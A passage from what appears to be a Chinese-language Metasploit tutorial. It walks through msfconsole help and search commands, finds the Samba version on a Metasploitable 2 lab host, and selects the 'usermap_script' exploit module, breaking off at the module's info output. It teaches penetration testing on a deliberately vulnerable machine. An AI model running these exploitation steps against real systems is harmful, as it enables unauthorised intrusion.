  \ 启动的漏洞利用命令。\n\n## 了解 MSFconsole\n\nMSFconsole 是 Metasploit Framework 最流行的接口，允许访问大多数功能，并且是\
  \ Metasploit 中最稳定的接口。因此，让我们进一步了解 MSFconsole。\n\n### MSFconsole 命令\n\n要显示帮助菜单，只需在\
  \ msfconsole 中输入 help 命令：\n\n```\nmsf > help\n```\n\n```\nCore Commands\n=============\n\
  \nCommand      Description\n--------     -----------\n?            Help menu\nbanner\
  \       Display an awesome metasploit banner\ncd           Change the current working\
  \ directory\ncolor        Toggle color\nconnect      Communicate with a host\n...\n\
  ```\n\n```\nDatabase Backend Commands\n=========================\n\nCommand    \
  \    Description\n--------       -----------\ndb_connect     Connect to an existing\
  \ database\ndb_disconnect  Disconnect from the current database instance\ndb_export\
  \      Export a file containing the contents of the\n...\n```\n\n```\nCredentials\
  \ Backend Commands\n============================\n\nCommand   Description\n--------\
  \  -----------\ncreds     List all credentials in the database\n```\n\n```\nmsf\
  \ >\n```\n\n看到输出结果起初可能会让人望而生畏；不过，我们已经学习了一些命令，例如数据库后端命令。现在，我们将重点关注在漏洞利用阶段最有帮助的命令，并在后续过程中学习剩余命令。\n\
  \n最有帮助的入门命令可能是 search 命令：\n\n```\nmsf > search -h\nUsage: search [keywords]\n\n\
  Keywords:\n  app      : Modules that are client or server attacks\n  author   :\
  \ Modules written by this author\n  bid      : Modules with a matching Bugtraq ID\n\
  \  cve      : Modules with a matching CVE ID\n  edb      : Modules with a matching\
  \ Exploit-DB ID\n  name     : Modules with a matching descriptive name\n  platform\
  \ : Modules affecting this platform\n  ref      : Modules with a matching ref\n\
  \  type     : Modules of a specific type (exploit, auxiliary, or post)\n\nExamples:\n\
  \  search cve:2009 type:exploit app:client\n\nmsf >\n```\n\n## 漏洞利用 Linux 服务器\n\n\
  Linux 是最广泛使用的操作系统之一。在之前的几个示例中，我们看到了如何扫描可用服务并使用漏洞扫描器查找漏洞。在本示例中，我们将处理 Linux 操作系统。我们将使用\
  \ Metasploitable 2 作为本示例中的易受攻击的 Linux 机器，但该过程对于利用运行 Samba 服务的任何 Linux 发行版和 Solaris\
  \ 都是类似的。让我们继续进行示例。\n\n### 准备工作\n\n- 1. 首先，我们将使用 `services` 命令显示之前 `nmap` 扫描的结果并过滤端口\
  \ 139 和 445：\n\n```\nmsf > services -c port,info -p 139,445 192.168.216.129\n\n\
  Services\n========\n\nhost      port  info\n----      ----  ----\n192.168.216.129\
  \  139  Samba smbd 3.X - 4.X workgroup:\nWORKGROUP\n192.168.216.129  445  Samba\
  \ smbd 3.0.20-Debian workgroup:\nWORKGROUP\n\nmsf >\n```\n\n- 2. 现在我们知道了正在运行的 Samba\
  \ 守护进程的版本，我们可以搜索漏洞，然后使用 `search` 命令搜索可用的漏洞利用。\n\n通过在 https://www.cvedetails.com\
  \ 上在线研究与 Samba 3.0.20 相关的 **通用漏洞和暴露 (CVE)**，我们可以找到一些可以利用的漏洞。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_449_0.png)\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_449_1.png)\n\n- 3. 使用 `search` 命令并按 CVE\
  \ 过滤，将类型设置为仅显示漏洞利用，关键字为 `samba`，我们会得到几个可能可用的漏洞利用。由于我们有一个评级为 excellent 的漏洞利用，我们将首先检查它。\n\
  \n### 操作方法\n\n- 1. 要选择漏洞利用，请使用 `use` 命令后跟漏洞利用名称：\n```\nmsf > use exploit/multi/samba/usermap_script\n\
  msf exploit(usermap_script) >\n```\n- 2. 现在我们已经选择了漏洞利用，可以通过运行 `info` 命令获取有关它的更多信息：\n\
  ```\nmsf exploit(usermap_script) > info\n\nName: Samba \"username map script\" Command\
